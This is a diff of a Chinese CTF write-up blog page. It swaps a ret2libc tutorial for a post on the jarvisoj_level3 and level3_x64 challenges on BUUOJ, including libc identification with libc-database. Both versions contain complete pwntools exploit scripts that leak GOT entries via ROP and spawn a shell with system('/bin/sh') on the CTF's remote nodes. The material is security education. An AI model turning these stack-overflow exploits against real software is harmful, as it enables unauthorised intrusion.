@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>有关ret2libc利用方法的整理 | Winghr&#39;s Blog</title>	
+<title>BUU-Pwn遇到的两道小坑 | Winghr&#39;s Blog</title>	
 
 <link rel="stylesheet" href="https://meowketer.github.io/styles/main.css">
 <script type="text/javascript">
@@ -142,10 +142,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">有关ret2libc利用方法的整理</h1>
+			<h1 class="wow swing entry-title">BUU-Pwn遇到的两道小坑</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-26 21:33:13" itemprop="datePublished" pubdate="">2020-03-26</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-04-10 19:39:45" itemprop="datePublished" pubdate="">2020-04-10</time></i>
 	          </div>
 			
 </span>
@@ -153,84 +153,159 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>ret2libc是栈溢出漏洞利用的一种常见手段。这种漏洞利用方式结合了很多利用方法及系统机制，如ROP技术、linux延迟绑定机制等。本文结合近期练习的几道ret2libc漏洞CTF题目，归纳其利用的过程。</p>
-<h2 id="原理">原理</h2>
-<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&quot;)，故而此时我们需要知道 system 函数的地址。首先先解释一下上面出现的一些名词。</p>
-<h3 id="libc是啥">libc是啥？</h3>
-<p>libc 是 Linux 下的 ANSI C 函数库。是C语言最基本的库函数。可以把它理解为可执行程序的运行依赖。</p>
-<h3 id="pltgot">PLT&amp;GOT</h3>
-<p>linux下的动态链接是通过PLT&amp;GOT来实现的，动态链接每个函数需要两个东西：<br>
-1、用来存放外部函数地址的数据段<br>
-2、用来获取数据段记录的外部函数地址的代码<br>
-对应有两个表，一个用来存放外部的函数地址的数据表称为全局偏移表（GOT, Global Offset Table），那个存放额外代码的表称为程序链接表（PLT，Procedure Link Table）<br>
-<img src="https://meowketer.github.io/post-images/1585232895786.jpeg" alt="" loading="lazy"><br>
-可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址<br>
-那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>
-<h3 id="延迟绑定机制">延迟绑定机制</h3>
-<p>只有动态库函数在被调用时，才会地址解析和重定位工作。简单来讲，在一个binary运行的过程中，只有真正运行过的函数才真正被调用真实地址运行。当一个功能模块未被加载使用的时候，比如准备调用一个函数，会通过先在PLT表找到记录相对的GOT表项的内容，即可跳转真实地址运行调用函数。也就是所谓的地址解析和重定位。</p>
-<h2 id="一个实例">一个实例</h2>
-<p>在上面整理了相关的理论原理，通过下面的这道题目来对应实践上述内容。这个binary来自BUUOJ的ciscn_2019_c_1难度不大，刚刚好是re2libc的利用漏洞。<br>
-<img src="https://meowketer.github.io/post-images/1585234609391.png" alt="" loading="lazy"><br>
-程序根据不同的选项有不同的功能，载入ida中查看一下：<br>
-<img src="https://meowketer.github.io/post-images/1585234863292.png" alt="" loading="lazy"><br>
-可以看到在encrypt函数内存在栈溢出漏洞。对应程序的功能选项则为1选项。<br>
-<img src="https://meowketer.github.io/post-images/1585235183513.png" alt="" loading="lazy"><br>
-但是这里的算法会将我们输入的内容加密处理，这样我们构造payload时就无法直接实现我们攻击流程。所以第一步需要对这个算法进行处理。在这个算法中注意到strlen函数，这个函数的主要特性如下：strlen所作的是一个计数器的工作，它从内存的某个位置（可以是字符串开头，中间某个位置，甚至是某个不确定的内存区域）开始扫描，直到碰到第一个字符串结束符'\0'为止，然后返回计数器值(长度不包含'\0')。因此在这里我们只需要在payload开始的部分加入'\0'字符即可完成绕过。<br>
-还有一个需要注意的点就是，程序远程运行在乌班图18.04的环境下，因此在构造系统调用时需要使用ret先对齐。</p>
-<h2 id="利用思路">利用思路</h2>
-<p>1.在漏洞函数输入前，有这样一段内容puts(&quot;Input your Plaintext to be encrypted&quot;)；所以puts函数在我们输入前就已将运行完一遍了，因此可以尝试泄露这个函数的地址来获取目标系统中使用的libc版本。因此构造第一段payload,泄露这个puts函数的地址。payload如下：</p>
-<pre><code>payload = '\0' + (0x50-1 + 8)*'a' + p64(pop_rdi) + p64(puts_got)
-payload+= p64(puts_plt) + p64(main) 
+				<h2 id="0x1-概括">0x1 概括</h2>
+<p>最近按照顺序刷了不少BUU的题目，大多都是常规的栈溢出，比较简单。<br>
+但是在这个过程还是遇到了一些麻烦，例如本文中将描述的两道题目：<br>
+jarvisoj_level3 &amp; jarvisoj_level3_x64<br>
+这两道题目在jarvisoj平台上的原题很简单，就是常规的ret2libc，并且提供libc文件<br>
+那么第一个坑就是：在BUU平台的这两道题目没有提供libc文件<br>
+第二个坑则是：题目来源的git上有libc文件，可惜，事实上远程端口上运行的不是这个libc版本。<br>
+第三个坑是：还是因为菜。</p>
+<h2 id="0x2-初步尝试">0x2 初步尝试</h2>
+<p>由于使用错误的libc是无法获取真正的函数偏移，就无法计算出真实能够完成系统调用的地址。<br>
+因此，当写完攻击脚本，得到的结果会是：<br>
+<img src="https://meowketer.github.io/post-images/1586519555820.png" alt="" loading="lazy"><br>
+于是，采用了和jarvisoj_level4 一样的方法，直接link出远程libc中的偏移，从而计算基地址加偏移完成计算。<br>
+<img src="https://meowketer.github.io/post-images/1586519908627.png" alt="" loading="lazy"><br>
+图中便是level4 link 成功的主要部分代码，然而事实上用在level3上没有想象的那样美好<br>
+报错了，，用我浅薄的知识面来猜测，应该是远程环境是有一定差异的。于是便陷入了困境</p>
+<p>----------几天后----------<br>
+对这两个题目仍是念念不忘，但是随着时间的流逝，我终于醒悟了，问题就是出在libc上<br>
+在看一下漏洞函数：<br>
+<img src="https://meowketer.github.io/post-images/1586520328314.png" alt="" loading="lazy"><br>
+攻击思路很简单，就是通过泄露write函数的地址后计算偏移，进而求得系统调用地址<br>
+那么需要解决的问题便是解决libc版本这个坑<br>
+由于题目开启了ALSR地址随机化，所以每次加载内部各函数的地址都会变化。<br>
+但是，有一点不能忘的细节，那就是地址随机化，不是全部的地址，通常地址的最后三位是仍不变的<br>
+利用这个特性，我们就可以查询对应函数的libc后三位基地址来确定其libc版本。<br>
+这里我采用的是libc-database  这是github的一个开源项目https://github.com/lieanu/libc-database<br>
+它有如下几个功能：</p>
+<ul>
+<li>/add 用来添加libc库<br>
+<code>./add /usr/lib/libc-2.21.so</code></li>
+<li>./find 用来查找libc版本<br>
+<code>$ ./find printf 260</code><br>
+<code>archive-glibc (id libc6_2.19-10ubuntu2_i386)</code></li>
+<li>./dump 用来输出libc中的一些函数的偏移</li>
+</ul>
+<pre><code>$ ./dump libc6_2.19-0ubuntu6.6_i386
+offset___libc_start_main_ret = 0x19a83
+offset_system = 0x00040190
+offset_recv = 0x000ed2d0
+offset_str_bin_sh = 0x160a24
 </code></pre>
-<p>首先就是用\0绕过加密算法，在补齐构造栈溢出的无用字符a，溢出后接ROP链再通过puts函数的plt表地址和got表地址泄露出puts真实的地址。最后在跳转回程序的开始，接第二段payload。</p>
-<p>2.完成泄露后，使用 LibcSearcher 模块link出来libc基地址，并进一步通过libc基地址加偏移的方法找到libc中的system地址及/bin/sh地址从而完成系统调用。代码如下：</p>
-<pre><code>libc = LibcSearcher('puts',puts)
-libc_addr=puts-libc.dump('puts')
-binsh=libc_addr+libc.dump('str_bin_sh')
-system=libc_addr+libc.dump('system')
+<p>那么我们就可以手动查找一下是否存在对应版本的libc文件<br>
+首先还是常规的函数地址泄露：</p>
+<pre><code>payload = &quot;A&quot; * offset
+payload += p32(write_plt)
+payload += p32(start_addr)
+payload += p32(1)
+payload += p32(write_got)
+payload += p32(4)
+p.sendline(payload)
+write_addr =u32(p.recv(4))
+print (&quot;[+]write_addr=&quot;)+hex(write_addr)
 </code></pre>
-<p>3.构造第二次payload，这次为系统调用。将上一步骤中link出来的一些地址构造入payload中：</p>
-<pre><code>payload1 = '\0'+(0x50-1+8)* &quot;b&quot; + p64(ret_addr) + p64(pop_rdi) 
-payload1+= p64(binsh) + p64(system)
-</code></pre>
-<p>溢出后跳转到system（/bin/sh）从而完成系统调用，我想这里就不需要解释了。</p>
-<h2 id="完整exp">完整exp</h2>
-<pre><code> from pwn import * 
-from LibcSearcher import LibcSearcher
-context.os='linux'
-context.arch='amd64'
-context.log_level='debug'
-elf = ELF(&quot;./6&quot;)
-puts_plt = elf.plt[&quot;puts&quot;]
-puts_got = elf.got[&quot;puts&quot;]
-main = elf.symbols[&quot;main&quot;]
-pop_rdi = 0x400c83
-ret_addr = 0x4006b9
-def get64addr():
-    return u64(io.recvuntil('\n')[:-1].ljust(8,'\0'))
-#io = process('./6')
-io=remote('node3.buuoj.cn',29305)
-io.sendlineafter(&quot;choice!\n&quot;,&quot;1&quot;)
-payload = '\0' + (0x50-1 + 8)*'a' + p64(pop_rdi) + p64(puts_got)
-payload+= p64(puts_plt) + p64(main) 
-io.sendlineafter('encrypted\n',payload)
-io.recvline()
-io.recvline()
-puts = get64addr()
-print hex(puts)
-libc = LibcSearcher('puts',puts)
-libc_addr=puts-libc.dump('puts')
-binsh=libc_addr+libc.dump('str_bin_sh')
-system=libc_addr+libc.dump('system')
-io.sendlineafter('choice!\n','1')
-payload1 = '\0'+(0x50-1+8)* &quot;b&quot; + p64(ret_addr) + p64(pop_rdi) 
-payload1+= p64(binsh) + p64(system)
-io.sendlineafter('encrypted\n',payload1)
-io.interactive()
+<p>接下来在取得泄露地址后，我们取地址的后三位进行libc版本查找：</p>
+<p><img src="https://meowketer.github.io/post-images/1586521824100.png" alt="" loading="lazy"><br>
+在这里明显可以看到后三位的基地址为3c0,那么去到libc-database查询一手：<br>
+<img src="https://meowketer.github.io/post-images/1586521948331.png" alt="" loading="lazy"><br>
+那么这样就得到和远程环境相同的libc版本了，接下来就是常规计算偏移取得shell...<br>
+其实到这里就已经恍然大悟，原来这道题目完全可以用LibcSearcher模块自动link,因为这个模块本就是基于libc_database写的python库。。这样一看还是比pwntools自带的DynELF香一点的感觉，不过好在手动查找libc也不麻烦，多花一分钟的时间问题不大。</p>
+<h2 id="0x3-level3完整exp">0x3 level3完整exp:</h2>
+<pre><code>#!/usr/bin/python
+#coding:utf-8
+from pwn import*
+context.log_level=&quot;debug&quot;  
 
+local = 0
+if local:
+	p = process('./level3')
+	elf = ELF('./level3')
+else:
+	p = remote('node3.buuoj.cn',25556)
+	elf = ELF('level3')
+
+start_addr = 0x8048350  
+write_got = elf.got[&quot;write&quot;]
+write_plt = elf.symbols[&quot;write&quot;]
+print (&quot;[+]write_plt=&quot;)+hex(write_plt)
+print (&quot;[+]write_got=&quot;)+hex(write_got)
+
+offset= 0x88 +4
+ 
+p.recvuntil(&quot;Input:\n&quot;)
+
+payload = &quot;A&quot; * offset
+payload += p32(write_plt)
+payload += p32(start_addr)
+payload += p32(1)
+payload += p32(write_got)
+payload += p32(4)
+p.sendline(payload)
+libc = ELF(&quot;libc6-i386_2.23-0ubuntu10_amd64.so&quot;)
+write_addr =u32(p.recv(4))
+print (&quot;[+]write_addr=&quot;)+hex(write_addr)
+
+write_offset = libc.symbols[&quot;write&quot;]      
+libc_base = write_addr - write_offset
+system_offset = libc.symbols[&quot;system&quot;]
+system = libc_base + system_offset   
+
+libc_sh=libc.search('/bin/sh\x00').next()
+bin_sh_addr = libc_base + libc_sh 
+print (&quot;system=&quot;) +hex(system)
+print (&quot;bin_sh_addr=&quot;) +hex(bin_sh_addr)
+p.recvline()
+payload = &quot;A&quot;*offset + p32(system) + p32(0) + p32(bin_sh_addr)
+p.sendline(payload)
+p.interactive()
 </code></pre>
-<h1 id="总结">总结</h1>
-<p>通过示例程序我们可以直观的看到，ret2libc的利用过程，其中，包含了对PLT表及GOT表来完成地址泄露，并通过泄露的地址判断libc版本，从而进一步link出libc的基地址及与其相对偏移的系统调用参数地址。最终完成了系统调用。</p>
+<h2 id="0x4-level32_x64">0x4 level32_x64</h2>
+<p>64位和32位主要的差异就是传参方式，在补充一次64位汇编传参：<br>
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样<br>
+简而言之，在64位程序中传参我们需要借助&quot;pop|rdi,ret&quot;等等一些寄存器来构造ROP链，并且在最后传入系统调用payload时还要注意堆栈平衡。通常这里会使用一段ret地址传入系统调用，还需要加入一段地址充当返回地址。<br>
+完整exp:</p>
+<pre><code>from pwn import *
+
+# p = process('./level3_x64')
+p = remote(&quot;node3.buuoj.cn&quot;, 25706)
+
+elf = ELF('./level3_x64')
+libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')
+
+rdi = 0x4006b3 
+rsi = 0x4006b1
+
+func_addr = elf.symbols['vulnerable_function'] 
+write_plt = elf.plt['write']  
+read_got = elf.got['read']
+
+payload = 'A' * 0x80 + 'B' * 0x08
+payload += p64(rdi) + p64(1)
+payload += p64(rsi) + p64(read_got) + p64(0)
+payload += p64(write_plt) + p64(func_addr)
+
+p.recvuntil('Input:\n')
+p.sendline(payload)
+
+read_addr = u64(p.recv(8))
+print 'read' + hex(read_addr)
+p.recvuntil('Input:\n')
+binsh = libc.search('/bin/sh').next()
+system = libc.symbols['system']
+read = libc.symbols['read']
+offset = read_addr - read
+binsh_addr = binsh + offset
+system_addr = system + offset
+
+payload2 = 'A' * 0x80 + 'B' * 0x08
+payload2 += p64(rdi) + p64(binsh_addr)
+payload2 += p64(system_addr) + p64(func_addr)
+p.sendline(payload2)
+p.interactive()
+</code></pre>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
@@ -240,10 +315,8 @@ io.interactive()
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://meowketer.github.io/post/not_the_same_3dsctf_2016_wp/" rel="prev"> not_the_same_3dsctf_2016_WP</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://meowketer.github.io/post/shellcode/" rel="next"> shellcode相关知识整理</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://meowketer.github.io/post/not_the_same_3dsctf_2016_wp/" rel="next"> not_the_same_3dsctf_2016_WP</a></div>
 		
 		</div>
 	</nav>
